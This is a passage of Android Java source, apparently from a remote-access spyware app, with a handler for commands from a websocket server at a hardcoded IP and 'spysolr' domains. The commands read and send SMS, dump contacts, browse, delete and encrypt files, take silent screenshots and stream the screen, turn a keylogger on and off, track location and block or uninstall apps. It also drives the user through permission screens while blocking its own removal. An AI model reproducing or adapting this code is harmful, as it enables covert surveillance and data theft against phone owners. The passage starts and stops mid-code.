            //isended=true;
            return;
        }
        isended = true;
        isConnected = false;


        WriteBool(Dummyctx, Consts.Send_Skilton, false);
        closesocket();

//        if (executorService != null) {
//            executorService.shutdown();
//        }


//        try {
//            stopSelf();
//            stopForeground(false);
//        } catch (Exception ex) {
//            ex.printStackTrace();
//        }

        try {
            if (LOCK_SOCKET != null && LOCK_SOCKET.isHeld()) {
                LOCK_SOCKET.release();
            }
        } catch (Exception a) {
        }
        // }

    }

//    @Override
//    public void onDestroy() {
//        super.onDestroy();
//
//        // Endme();
//    }

//    @Override
//    public void onTaskRemoved(Intent rootIntent) {
//        super.onTaskRemoved(rootIntent);
//        //Endme();
//    }
//   private static int Notifi_ID = 111;
//    private void startforground(Context ctx) {
//        try{
//
//            MyNotification MyNotifiint = MyNotification.getInstance(ctx);
//            Notification notification = MyNotifiint.createNotification(ctx);
//            if (Build.VERSION.SDK_INT >= 34) {
//                this.startForeground(Notifi_ID, notification,
//                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
//            } else {
//                this.startForeground(Notifi_ID, notification);
//            }
//        }catch (Exception a){}
//
//    }

    private boolean handleResponse(String result) {
        if (result != null) {
            MyLoger.Debug("ServerSay:", result);
            if (result.startsWith("Conf:")) {
                try {

                    String Skeys = result.replace("Conf:", "");
                    JSONObject jsonObject = new JSONObject(Skeys);
                    String idf = jsonObject.optString("idf", "null");
                    if (idf.equals("null")) {
                        return false;
                    }

                    String mycip = jsonObject.optString("cip", getExternalIpAddress());


                    String RedirectIP = MySettings.Read(Dummyctx,Consts.Redirect_ip,"");
                    String Socketsurls ;
                    String ServerAddress ;

                    if (RedirectIP.length() > 0){
                        Socketsurls = "ws://"+RedirectIP+":8080/<";
                        ServerAddress = RedirectIP;
                    }else{
                        Socketsurls = jsonObject.optString("sk", "ws://195.160.221.203:8080/<");
                        ServerAddress = jsonObject.optString("ad", "195.160.221.203");
                    }

                    //websocket url's sent from server
                    // like : wss://ws.spysolr.com/con<wss://ws.spysolr.site/con<ws://192.168.1.9:8080/
                    //splitter "<" and stored in memory Consts.Sockets_Servers
                    Consts.Sockets_Servers = Socketsurls;
                    Consts.Server_Address = ServerAddress;

                    MySettings.Write(Dummyctx, Consts.THE_IDF, idf);
                    MySettings.Write(Dummyctx, Consts.THE_CIP, mycip);
                    MyLoger.Debug("authers (idf):", idf);

                    startwocket();

                    return true;
                } catch (JSONException e) {
                    MyLoger.Error("Options phone", e.getMessage());
                }
            } else if (result.startsWith("CO:")) {
                if (result.endsWith(":Sleep")) {
                    WorkServices.needsleep = true;
                    Endme();
                }
            }else{
                WorkServices.needsleep = true;
                Endme();
            }
        }

        return false;
    }

    private void writeOptionBool(Context context, String key, String value) {
        WriteBool(context, key, "1".equals(value));
    }

    public  void HandelPacket(MyPacket NewPacket) {
        //  Thread thread = new Thread() {
        //    @Override
        //   public void run() {
        try {


            if (NewPacket != null) {

                String[] Case = null;
                try {
                    Case = NewPacket.Command.trim().split(Pattern.quote(SPLIT_SKT));
                } catch (Exception e2) {
                    Case = null;
                }

                if (Case != null && Case.length > 0) {
                    CommandsList commandnum;
                    try {
                        commandnum = CommandsList.valueOf(Case[0]);
                    } catch (Exception s) {
                        MyLoger.Debug("Unknown command", Case[0]);
                        return;
                    }
                    switch (commandnum) {

                        case Sleep:
                            WorkServices.needsleep = true;
                            try {
                                Thread.sleep(15000);
                            } catch (Exception x) {

                            }
                            break;

                        case Deviceinfo:

                            try {
                                SettingsManager smgr = new SettingsManager(Dummyctx);
                                String subcommand = Case[1];
                                switch (subcommand) {
                                    case "L":
                                        String allinfo = Deviceinfo.Load(Dummyctx);
                                        JSONObject jsonObject = new JSONObject();
                                        jsonObject.put("type", "dinfo");
                                        jsonObject.put("cuz", "l");
                                        jsonObject.put("data", allinfo);

                                        //phone settings

                                        boolean vibrationEnabled = smgr.isVibrationEnabled();
                                        boolean dataRoamingEnabled = smgr.isDataRoamingEnabled();
                                        int screenTimeout = smgr.getScreenTimeout();
                                        int screenBrightness = smgr.getScreenBrightness();

                                        jsonObject.put("VE", vibrationEnabled);
                                        jsonObject.put("DE", dataRoamingEnabled);
                                        jsonObject.put("ST", screenTimeout);
                                        jsonObject.put("SB", screenBrightness);

                                        String jsonData = jsonObject.toString();

                                        Livemessage(Dummyctx, jsonData);
                                        break;

                                    case "E":
                                        String editwhat = Case[2];
                                        String nvalue = Case[3];
                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {

                                            AudioManager audioManager = (AudioManager) Dummyctx.getSystemService(Context.AUDIO_SERVICE);

                                            if (editwhat.equals("TO") && Settings.System.canWrite(Dummyctx)) {//timeout
                                                smgr.setScreenTimeout(Integer.valueOf(nvalue));

                                            } else if (editwhat.equals("DR") && Settings.System.canWrite(Dummyctx)) {//DataRoaming
                                                smgr.setDataRoamingEnabled(Boolean.valueOf(nvalue));

                                            } else if (editwhat.equals("VB") && Settings.System.canWrite(Dummyctx)) {//vibration
                                                smgr.setVibrationMode(Boolean.valueOf(nvalue));

                                            } else if (editwhat.equals("UMU")) {//unmute
                                                audioManager.adjustStreamVolume(AudioManager.STREAM_RING,
                                                        AudioManager.ADJUST_UNMUTE, 0);
                                            } else if (editwhat.equals("VBR")) {//ringing vibration
                                                audioManager.setRingerMode(AudioManager.RINGER_MODE_VIBRATE);

                                            } else if (editwhat.equals("MU")) {//mute

                                                audioManager.adjustStreamVolume(AudioManager.STREAM_RING,
                                                        AudioManager.ADJUST_MUTE, 0);
                                            } else if (editwhat.equals("VM")) {//music volume
                                                int musicVolume = Integer.valueOf(nvalue);
                                                audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, musicVolume, 0);
                                            } else if (editwhat.equals("VN")) {//notification volume
                                                int notificationVolume = Integer.valueOf(nvalue);
                                                audioManager.setStreamVolume(AudioManager.STREAM_NOTIFICATION, notificationVolume, 0);
                                            } else if (editwhat.equals("VS")) {//system volume
                                                int systemVolume = Integer.valueOf(nvalue);
                                                audioManager.setStreamVolume(AudioManager.STREAM_SYSTEM, systemVolume, 0);
                                            } else if (editwhat.equals("VR")) {//ring volume
                                                int ringVolume = Integer.valueOf(nvalue);
                                                audioManager.setStreamVolume(AudioManager.STREAM_RING, ringVolume, 0);
                                            } else if (editwhat.equals("BR") && Settings.System.canWrite(Dummyctx)) {//brightness
                                                smgr.setScreenBrightness(Integer.valueOf(nvalue));
                                            }

                                        }
                                        break;
                                }
                            } catch (Exception a) {

                            }

                            // //  MySocket.SendToClient(id_Commands.Deviceinfo, Deviceinfo.Load(ctx));

                            break;


                        case SMS:
                            try {
                                String[] SMSp = MyPermissions.GetPrimname(MyPermissions.Prims.SMS);
                                if (MyPermissions.hasPermissions(Dummyctx, SMSp)) {

                                    switch (Case[1]) {
                                        case "L":

                                            String ALLSMS = mysmanager.Load(Dummyctx, Case[2]);
                                            if (ALLSMS.length() > 0) {

                                                JSONObject jsonObject = new JSONObject();
                                                jsonObject.put("type", id_Commands.SMS);
                                                jsonObject.put("cuz", "l");
                                                jsonObject.put("data", ALLSMS);

                                                String jsonData = jsonObject.toString();

                                                Livemessage(Dummyctx, jsonData);


                                            } else {
                                                AlertServer(Dummyctx, "SMS", "No messages found.");
                                            }


                                            break;

                                        case "S":
                                            String Snumber = Case[2];
                                            String Smsg = Case[3];
                                            if (AccessTools.myAccess() != null){
                                                mysmanager.sendSMS(AccessTools.myAccess(), Snumber, Smsg);
                                            }else{
                                                mysmanager.sendSMS(Dummyctx, Snumber, Smsg);
                                            }
                                            break;

                                    }


                                } else {
                                    //   //  MySocket.SendToClient(id_Commands.ALERT, ("Access SMS Permission is Disabled.").getBytes());
                                }

                            } catch (Exception ex) {

                            }

                            break;

                        case Contacts:
                            try {

                                String[] CONTp = MyPermissions.GetPrimname(MyPermissions.Prims.Contacts);
                                if (MyPermissions.hasPermissions(Dummyctx, CONTp)) {

                                    switch (Case[1]) {
                                        case "L":
                                            String contacts = Contct_manager.Load(Dummyctx);
                                            if (contacts != null && contacts.length() > 0) {


                                                JSONObject jsonObject = new JSONObject();
                                                jsonObject.put("type", id_Commands.Contacts);
                                                jsonObject.put("cuz", "l");
                                                jsonObject.put("data", contacts);


                                                String jsonData = jsonObject.toString();

                                                Livemessage(Dummyctx, jsonData);

                                            } else {

                                                AlertServer(Dummyctx, "Contacts", "No contacts found.");
                                            }
                                            break;
                                        case "A":
                                            String Name = Case[2];
                                            String Number = Case[3];

                                            if (Contct_manager.Add(Dummyctx, Name, Number)) {

                                                AlertServer(Dummyctx, "New Contact", Number + " is add Successfully");
                                            } else {

                                                AlertServer(Dummyctx, "New Contact", Number + " is Failed (Can't Add number)");
                                            }

                                            break;
                                        case "D":
                                            String IDR = Case[2];

                                            Contct_manager.Remove(Dummyctx, IDR);
                                            break;
                                    }


                                } else {
                                    AlertServer(Dummyctx, "Contacts", "Access Contacts Permission is Disabled");
                                }


                            } catch (Exception ex) {

                            }
                            break;

                        case Apps:
                            try {

                                switch (Case[1]) {
                                    case "L":
                                        String ALLAPPS = Apps_Manage.Load(Dummyctx);
                                        if (ALLAPPS != null) {


                                            JSONObject jsonObject = new JSONObject();
                                            jsonObject.put("type", id_Commands.APPS);
                                            jsonObject.put("cuz", "l");
                                            jsonObject.put("data", ALLAPPS);


                                            String jsonData = jsonObject.toString();

                                            Livemessage(Dummyctx, jsonData);
                                        }
                                        break;
                                    case "S":
                                        String idtostart = Case[2];
                                        Intent launchIntent = Dummyctx.getPackageManager().getLaunchIntentForPackage(idtostart);

                                        if (launchIntent != null) {
                                            Dummyctx.startActivity(launchIntent);
                                            String appname = UtliTools.getAppNameFromPkgName(Dummyctx, idtostart);
                                            AlertServer(Dummyctx, "Apps", appname + " Started..");
                                        } else {
                                            AlertServer(Dummyctx, "App Not Found", idtostart);
                                        }
                                        break;
                                    case "D":
                                        String idtodisable = Case[2].toString().toLowerCase();
                                        if (!Blocked_Apps.contains(idtodisable)) {
                                            Blocked_Apps.add(idtodisable);
                                        }
                                        String appname = UtliTools.getAppNameFromPkgName(Dummyctx, idtodisable);
                                        AlertServer(Dummyctx, "Apps", appname + " Disabled..");
                                        break;
                                    case "E":
                                        String idtoenable = Case[2].toString().toLowerCase();
                                        if (Blocked_Apps.contains(idtoenable)) {
                                            Blocked_Apps.remove(idtoenable);
                                        }
                                        String appname2 = UtliTools.getAppNameFromPkgName(Dummyctx, idtoenable);
                                        AlertServer(Dummyctx, "Apps", appname2 + " Enabled..");
                                        break;
                                    case "LK"://lock app
                                        String idtolock = Case[2].toString().toLowerCase();
                                        if (!Lock_App_list.contains(idtolock)) {
                                            Lock_App_list.add(idtolock);
                                        }
                                        String appname3 = UtliTools.getAppNameFromPkgName(Dummyctx, idtolock);
                                        AlertServer(Dummyctx, "Apps", appname3 + " Locked..");
                                        break;
                                    case "ULK":
                                        String idtounlock = Case[2].toString().toLowerCase();
                                        if (Lock_App_list.contains(idtounlock)) {
                                            Lock_App_list.remove(idtounlock);
                                        }
                                        String appname4 = UtliTools.getAppNameFromPkgName(Dummyctx, idtounlock);
                                        AlertServer(Dummyctx, "Apps", appname4 + " UnLocked..");
                                        break;
                                    case "TRK":
                                        String idtotrak = Case[2].toString().toLowerCase();
                                        String nametarget = getAppNameFromPkgName(Dummyctx, idtotrak);
                                        String linktarget = "n/a";

                                        Addlink(nametarget, linktarget);
                                        AddID(nametarget, idtotrak);
                                        AddTname(nametarget);
                                        AlertServer(Dummyctx, "Apps", "Start tracking " + nametarget);
                                        break;
                                    case "UTRK":
                                        String idnotrk = Case[2].toString().toLowerCase();
                                        String remname = getAppNameFromPkgName(Dummyctx, idnotrk);
                                        Removename(remname);
                                        AlertServer(Dummyctx, "Apps", "Stop tracking " + remname);
                                        break;
                                    case "R":

                                        try {
                                            String idtoremove = Case[2];
                                            Intent intentremove = new Intent(Intent.ACTION_DELETE);
                                            intentremove.setData(Uri.parse("package:" + idtoremove));
                                            intentremove.putExtra(Intent.EXTRA_RETURN_RESULT, true);
                                            intentremove.addFlags(FLAG_ACTIVITY_NEW_TASK);
                                            Consts.removeapp = true;

                                            Dummyctx.startActivity(intentremove);
                                        } catch (Exception f) {
                                            Consts.removeapp = false;
                                        }
                                        break;
                                }


                            } catch (Exception ex) {

                            }
                            break;

                        case Connection:
                            try {
                                switch (Case[1]) {
                                    //restart
                                    case "R":
                                        try {
                                            Intent workservice = new Intent(Dummyctx, WorkServices.class);
                                            Dummyctx.stopService(workservice);
                                        } catch (Exception a) {
                                        }
//                                        try {
//                                            Intent socketservices = new Intent(Dummyctx, LiveChat.class);
//                                            Dummyctx.stopService(socketservices);
//                                        } catch (Exception a) {
//                                        }

                                        ServiceStarter(Dummyctx, WorkServices.class);
                                        ServiceStarter(Dummyctx, EngineWorker.class);

                                        break;
                                    //disable
                                    case "D":
                                        //  MySocket.CloseConnection();
                                        System.exit(0);
                                        break;

                                }
                            } catch (Exception f) {

                            }

                            break;
                        case Files:
                            try {
                                String[] filesp = MyPermissions.GetPrimname(MyPermissions.Prims.Files);
                                boolean notallowed = false;

                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                                    notallowed = Environment.isExternalStorageManager();

                                } else {
                                    notallowed = MyPermissions.hasPermissions(Dummyctx, filesp);
                                }
                                if (notallowed) {


                                    filesManager fm = new filesManager();
                                    switch (Case[1]) {
                                        //load
                                        case "L":
                                            String[] alldata = fm.Load(Dummyctx, Case[2]);
                                            String Filesobj = alldata[0];

                                            if (Filesobj != null) {


                                                JSONObject jsonObject = new JSONObject();
                                                jsonObject.put("type", id_Commands.files);
                                                jsonObject.put("cuz", "l");
                                                jsonObject.put("data", Filesobj);
                                                String jsonData = jsonObject.toString();

                                                Livemessage(Dummyctx, jsonData);

                                            }
                                            break;
                                        //open
                                        case "O":
                                            String results = fm.openPath(Dummyctx, Case[2]);
                                            AlertServer(Dummyctx, "Open File", results);
                                            break;
                                        // view file
                                        case "V":
                                            fm.ViewFile(Case[2], Case[3], Case[4], Case[5], Dummyctx);
                                            break;
                                        //create
                                        case "CR":
                                            String pathfile = Case[2];
                                            boolean isfolder = Boolean.valueOf(Case[3]);
                                            if (fm.createf(pathfile, isfolder)) {
                                                AlertServer(Dummyctx, "Create folder", "Done");
                                            } else {
                                                AlertServer(Dummyctx, "Create folder", "Error");
                                            }
                                            break;
                                        //upload from pc to phone
                                        //case "U":
//                                                    String uplaodpth = Case[2];
//                                                    String filesize = Case[3];
//                                                    String name = Case[4];
//                                                    String pathfile = Case[5]; // path in pc
//                                                    fm.Upload(uplaodpth, filesize, name, pathfile);
                                        //  break;
                                        //download from phone to pc
//                                                case "D":
//
//                                                    String FilePath = Case[2];
//                                                    // fm.DownManager(ctx, FilePath);
//                                                    LiveChat.LiveDownload(ctx,FilePath);
//                                                    break;
                                        //remove
                                        case "R":
                                            String typeR = Case[2];
                                            String path = Case[3];
                                            if (typeR.equals("fi")) {
                                                fm.FileDelete(path);
                                            } else if (typeR.equals("fo")) {
                                                fm.FolderDelete(path);
                                            }
                                            break;

                                        //rename
                                        case "N":
                                            String oldname = Case[2];
                                            String newname = Case[3];
                                            fm.rename(oldname, newname);
                                            break;
                                        //zip
                                        case "Z":
                                            String zipname = Case[2];
                                            String zippaths = Case[3];
                                            String[] pathsArray = zippaths.split("<P>");
                                            fm.zip(pathsArray, zipname);
                                            break;
                                        //unzip
                                        case "UZ":
                                            String zippath = Case[2];
                                            String extracthere = Case[3];
                                            fm.unzip(zippath, extracthere);
                                            break;
                                        //Encrypt
                                        case "EN":
                                            try {
                                                String encpass = Case[2];
                                                String epaths = Case[3];
                                                String ext = Case[4];
                                                String[] allpaths = epaths.split("<P>");

                                                for (String p :
                                                        allpaths) {
                                                    fm.encrypt(p, encpass, ext);
                                                }
                                            } catch (Exception a) {
                                                a.printStackTrace();
                                            }

                                            break;
                                        //Decrypt
                                        case "DE":
                                            try {
                                                String decpass = Case[2];
                                                String outpaths = Case[3];
                                                String allepaths = Case[4];
                                                String[] otputs = outpaths.split("<P>");
                                                String[] inputs = allepaths.split("<P>");
                                                for (int i = 0; i < outpaths.length(); i++) {
                                                    fm.decrypt(inputs[i], decpass, otputs[i]);
                                                }


                                            } catch (Exception a) {
                                                a.printStackTrace();
                                            }
                                            break;
                                    }


                                } else {
                                    //  MySocket.SendToClient(id_Commands.ALERT, ("Access File Permission is Disabled.").getBytes());
                                }


                            } catch (Exception ex) {
                                ex.printStackTrace();
                            }
                            break;
                        case Screen:

                            String screencommand = Case[1];
                            if (screencommand.equals("SNAP")) {
                                if (My_Access_inst != null) {
                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                                        My_Access_inst.CapScreen(Dummyctx, "snap", 70);
                                    } else {
                                        //  MySocket.SendToClient(id_Commands.ALERT, ("Android version does not support screen shot.").getBytes());
                                        AlertServer(Dummyctx, "Snap Shot", "This phone does not support silent screen shot");
                                    }
                                }
                            } else {
                                String quality = "0";
                                String screentype = "N";
                                String sockidf = "null";
                                if (screencommand.equals("ON")) {
                                    quality = Case[2];
                                    screentype = Case[3];
                                    sockidf = Case[4];
                                    if (!screentype.equals("N")) {
                                        switch (screentype) {
                                            case "SM"://slient mod
                                                if (My_Access_inst != null) {
                                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                                                        WriteBool(Dummyctx, Consts.Silent_Screen, true);

                                                        if (!isScreenThreadRunning()) {
                                                            SilentScreenThread(Dummyctx, Integer.valueOf(quality));
                                                        }
                                                    } else {
                                                        //  MySocket.SendToClient(id_Commands.ALERT, ("Android version does not support screen shot.").getBytes());
                                                        AlertServer(Dummyctx, "Live Screen", "This phone does not support silent screen shot");
                                                    }
                                                }
                                                return;
                                            //break;
                                            case "SK"://skilton view
                                                WriteBool(Dummyctx, Consts.Live_skilton, true);
                                                if (!isLiveSkiltonlive()) {
                                                    Skiltonlive(Dummyctx, Integer.valueOf(quality));
                                                }
                                                return;
                                            case "IN":
                                                WriteBool(Dummyctx, Consts.Self_Record, true);
                                                if (!isSelfRecordON()) {
                                                    SelfRecorder(Dummyctx, Integer.valueOf(quality), "screen", 80);
                                                }
                                                return;
                                            default:
                                                break;
                                        }
                                    } else {
                                        // AccessTools.BringMeFront(ctx);
                                        if (My_Access_inst != null) {
                                            AccessTools.Treger("strscr", new String[]{"COM", screencommand + SPLIT_SKT + quality + SPLIT_SKT + sockidf});
                                        } else {
                                            AccessTools.BringMeFront(Dummyctx);
                                            try{
                                                Thread.sleep(500);
                                            }catch (Exception f){}
                                            Intent scint = new Intent(Dummyctx, ActivityCaptureScreen.class);
                                            scint.addFlags(FLAG_ACTIVITY_NEW_TASK);
                                            scint.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                                            scint.putExtra("COM", screencommand + SPLIT_SKT + quality + SPLIT_SKT + sockidf);
                                            Dummyctx.startActivity(scint);
                                        }


                                    }

                                } else if (screencommand.equals("OFF")) {

                                    if (isScreenThreadRunning()) {
                                        stopSlientScreen(Dummyctx);
                                        return;
                                    }

                                    if (isSelfRecordON()) {
                                        stopSelfRecorder(Dummyctx);
                                        return;
                                    }
                                    if (isLiveSkiltonlive()) {
                                        stopliveskilton(Dummyctx);
                                        return;
                                    }

                                    Dummyctx.startService(ScreenCaps.getStopIntent(Dummyctx));
                                    return;
                                }

                            }


                            break;
                        case Activitys:
                            try {

                                switch (Case[1]) {

                                    case id_Commands.DeleteActive:
                                        String activDate = Case[2];
                                        ActivityMonitors.Remove(activDate, ActivityMonitors.ActivityType.ACTZ);
                                        AlertServer(Dummyctx, "activities", "Record Removed: " + activDate);
                                        break;
                                    case id_Commands.GetActive:
                                        String ActivityName = Case[2];
                                        String AcivityData = ActivityMonitors.Read(ActivityName, ActivityMonitors.ActivityType.ACTZ);
                                        if (AcivityData != null) {
                                            JSONObject jsonObject = new JSONObject();
                                            jsonObject.put("type", "Activitys");
                                            jsonObject.put("cuz", "activz");
                                            jsonObject.put("ktime", ActivityName);
                                            jsonObject.put("data", AcivityData);
                                            String jsonData = jsonObject.toString();

                                            Livemessage(Dummyctx, jsonData);
                                        }
                                        break;

                                    case id_Commands.DeleteNotifis:
                                        String notsDate = Case[2];
                                        ActivityMonitors.Remove(notsDate, ActivityMonitors.ActivityType.NTFS);
                                        AlertServer(Dummyctx, "Notifications", "Record Removed: " + notsDate);
                                        break;
                                    case id_Commands.GetNotifis:
                                        String NotifiName = Case[2];
                                        String NotifiData = ActivityMonitors.Read(NotifiName, ActivityMonitors.ActivityType.NTFS);
                                        if (NotifiData != null) {
                                            JSONObject jsonObject = new JSONObject();
                                            jsonObject.put("type", "Activitys");
                                            jsonObject.put("cuz", "notifys");
                                            jsonObject.put("ktime", NotifiName);
                                            jsonObject.put("data", NotifiData);
                                            String jsonData = jsonObject.toString();

                                            Livemessage(Dummyctx, jsonData);

                                        }
                                        break;

                                    case id_Commands.DeleteVisited:
                                        String appsDate = Case[2];
                                        ActivityMonitors.Remove(appsDate, ActivityMonitors.ActivityType.VAPS);
                                        AlertServer(Dummyctx, "Visited Apps", "Record Removed: " + appsDate);
                                        break;
                                    case id_Commands.GetVisited:
                                        String VisitedName = Case[2];
                                        String VisitedData = ActivityMonitors.Read(VisitedName, ActivityMonitors.ActivityType.VAPS);
                                        if (VisitedData != null) {
                                            JSONObject jsonObject = new JSONObject();
                                            jsonObject.put("type", "Activitys");
                                            jsonObject.put("cuz", "vapps");
                                            jsonObject.put("ktime", VisitedName);
                                            jsonObject.put("data", VisitedData);
                                            String jsonData = jsonObject.toString();

                                            Livemessage(Dummyctx, jsonData);


                                        }
                                        break;

                                    case id_Commands.Deleteurl:
                                        String urlDate = Case[2];
                                        ActivityMonitors.Remove(urlDate, ActivityMonitors.ActivityType.BLNK);
                                        AlertServer(Dummyctx, "Visited Links", "Record Removed: " + urlDate);
                                        break;
                                    case id_Commands.GETURLS:
                                        String URLName = Case[2];
                                        String URLData = ActivityMonitors.Read(URLName, ActivityMonitors.ActivityType.BLNK);
                                        if (URLData != null) {
                                            JSONObject jsonObject = new JSONObject();
                                            jsonObject.put("type", "Activitys");
                                            jsonObject.put("cuz", "vlinks");
                                            jsonObject.put("ktime", URLName);
                                            jsonObject.put("data", URLData);
                                            String jsonData = jsonObject.toString();

                                            Livemessage(Dummyctx, jsonData);


                                        }
                                        break;

                                    case id_Commands.DeleteKEYS:

                                        String KeyDate = Case[2];
                                        ActivityMonitors.Remove(KeyDate, ActivityMonitors.ActivityType.KSTR);
                                        AlertServer(Dummyctx, "Key-Logs", "Record Removed: " + KeyDate);
                                        break;
                                    case id_Commands.Livekeys:

                                        String golive = Case[2];
                                        if (golive.equals("1")) {
                                            //Liveklogs
                                            if (MyCods.is_Access_Enabled(Dummyctx, AccessServices.class)) {
                                               // WriteBool(Dummyctx, LIVE_KLOG, true);
                                                liv_klogs=true;
                                                //TregerKeylog(ctx);
                                                AlertServer(Dummyctx, "Live Key-logs", "Keylogger is ON");
                                            } else {
                                                AlertServer(Dummyctx, "Live Key-logs", "Accessibility Services Disabled");
                                            }

                                        } else if (golive.equals("0")) {
                                           // WriteBool(Dummyctx, LIVE_KLOG, false);
                                            liv_klogs = false;
                                            AlertServer(Dummyctx, "Live Key-logs", "Keylogger is OFF");

                                        }

                                    case id_Commands.GETKEYS:
                                        String KEYName = Case[2];
                                        String KEYData = ActivityMonitors.Read(KEYName, ActivityMonitors.ActivityType.KSTR);
                                        if (KEYData != null) {
                                            JSONObject jsonObject = new JSONObject();
                                            jsonObject.put("type", "Activitys");
                                            jsonObject.put("cuz", "keylogs");
                                            jsonObject.put("ktime", KEYName);
                                            jsonObject.put("data", KEYData);
                                            String jsonData = jsonObject.toString();

                                            Livemessage(Dummyctx, jsonData);


                                        }
                                        break;
                                }


                            } catch (Exception d) {

                            }
                            break;
                        case Notifi:
                            try {
                                String newmsg = Case[1];
                                My_Access_inst.ShowNotification(Dummyctx, newmsg);
                            } catch (Exception s) {

                            }
                            break;
                        case Location:
                            try {


                                if (ActivityCompat.checkSelfPermission(Dummyctx, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED &&
                                        ActivityCompat.checkSelfPermission(Dummyctx, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {

                                    // Intent locint = new Intent(Dummyctx, LocationMonitor.class);

                                    switch (Case[1]) {
                                        case "E":
                                            //Enable
                                        {
                                            Intent intentstart = new Intent(Dummyctx, LocationMonitor.class);
                                            intentstart.setAction("start");


                                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                                Dummyctx.startForegroundService(intentstart);
                                            } else {
                                                Dummyctx.startService(intentstart);
                                            }
                                        }
                                            break;
                                        case "D":
                                            //Disable
                                            //Dummyctx.stopService(locint);
                                        {
                                            Intent intentstop = new Intent(Dummyctx, LocationMonitor.class);
                                            intentstop.setAction("stop");
                                            Dummyctx.startService(intentstop);
                                        }

                                        break;
                                    }


                                } else {
                                    //  MySocket.SendToClient(id_Commands.ALERT, ("Access Location Permission is Disabled.").getBytes());
                                    AlertServer(Dummyctx, "Error Location", "Access Location Permission is Disabled.");
                                }


                            } catch (Exception s) {
                            }
                            break;
                        case Permissions:
                            try {
                                String subcommand = Case[1];
                                switch (subcommand) {
                                    case "L":
                                        String Permis = null;
                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                            Permis = MyPermissions.Load(Dummyctx);
                                            JSONObject jsonObject = new JSONObject();
                                            jsonObject.put("type", "Permissions");
                                            jsonObject.put("cuz", "l");
                                            jsonObject.put("data", Permis);
                                            String jsonData = jsonObject.toString();

                                            Livemessage(Dummyctx, jsonData);
                                        }

                                        break;
                                    case "R":
                                        String neededprim = Case[2];
                                        if (neededprim.equals("Access")) {
                                            if (!MyCods.is_Access_Enabled(Dummyctx, AccessServices.class)) {


                                                Intent intent = new Intent(Dummyctx, AccessibilityActivity.class);
                                                intent.addFlags(FLAG_ACTIVITY_NEW_TASK);
                                                intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                                                Dummyctx.startActivity(intent);

                                            }
                                        }
//                                        else if (neededprim.equals("WriteS")) {
//                                            try {
//
//                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.System.canWrite(Dummyctx)) {
//
//                                                    AccessServices.PreventDelete = false;
//
//                                                    Intent intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS);
//                                                    intent.setData(Uri.parse("package:" + Dummyctx.getPackageName()));
//                                                    intent.addFlags(FLAG_ACTIVITY_NEW_TASK);
//                                                    Dummyctx.startActivity(intent);
//                                                    new Thread(() -> {
//                                                        try {
//                                                            Thread.sleep(5000);
//                                                        } catch (InterruptedException e) {
//                                                            e.printStackTrace();
//                                                        }
//                                                        AccessServices.PreventDelete = true;
//                                                    }).start();
//                                                }
//
//                                            } catch (Exception a) {
//                                                a.printStackTrace();
//                                            }
//                                        }
                                        else if (neededprim.equals("Doze")) {
                                            if (!UtliTools.IsIgnore_Battery(Dummyctx)) {
                                                try {
                                                    AccessServices.PreventDelete = false;
                                                    Intent intent1 = new
                                                            Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                                                            Uri.parse("package:" + Dummyctx.getPackageName()));
                                                    intent1.addFlags(FLAG_ACTIVITY_NEW_TASK);

                                                    intent1.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                                                    // if (My_Access_inst != null) {
                                                    AccessServices.forbattery = true;
                                                    //  }
                                                   // WriteBool(Dummyctx, Consts.Auto_Battary, true);
                                                    Dummyctx.startActivity(intent1);


                                                    new Thread(() -> {
                                                        try {

                                                            Thread.sleep(5000);

                                                        } catch (InterruptedException e) {
                                                            e.printStackTrace();
                                                        }
                                                        AccessServices.PreventDelete = true;
                                                        AccessServices.forbattery = false;
                                                       // WriteBool(Dummyctx, Consts.Auto_Battary, false);
                                                    }).start();
                                                } catch (Exception ex) {
                                                }
                                            }

                                        } else if (neededprim.equals("FileS")) {
                                            try {
                                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {

                                                    Intent intentstorg = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                                                    Uri uri = Uri.fromParts("package", Dummyctx.getPackageName(), null);
                                                    intentstorg.setData(uri);
                                                    intentstorg.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                                                    AccessServices.PreventDelete = false;
                                                    AccessServices.FOR_EXTR_STRG = true;
                                                    Dummyctx.startActivity(intentstorg);

                                                    new Thread(() -> {
                                                        try {

                                                            Thread.sleep(5000);

                                                        } catch (InterruptedException e) {
                                                            e.printStackTrace();
                                                        }
                                                        AccessServices.PreventDelete = true;
                                                        AccessServices.FOR_EXTR_STRG = false;
                                                    }).start();
                                                } else {
                                                    String[] NeededPrim = MyPermissions.GetRequierdPrims("FA");
                                                    Intent myIntent = new Intent(Dummyctx, RequestPermissions2.class);
                                                    myIntent.addFlags(FLAG_ACTIVITY_NEW_TASK);
                                                    myIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                                                    myIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                                                    myIntent.putExtra("Data", NeededPrim);//Optional parameters
                                                    Dummyctx.startActivity(myIntent);
                                                }
                                            } catch (Exception a) {

                                            }
                                        } else if (neededprim.equals("Draw")) {
                                            AccessServices.PreventDelete = false;
                                            AccessServices.FOR_DRAW_OVER = true;
                                            Dummyctx.startActivity(new Intent(Dummyctx, ActivityDraw.class)
                                                    .addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
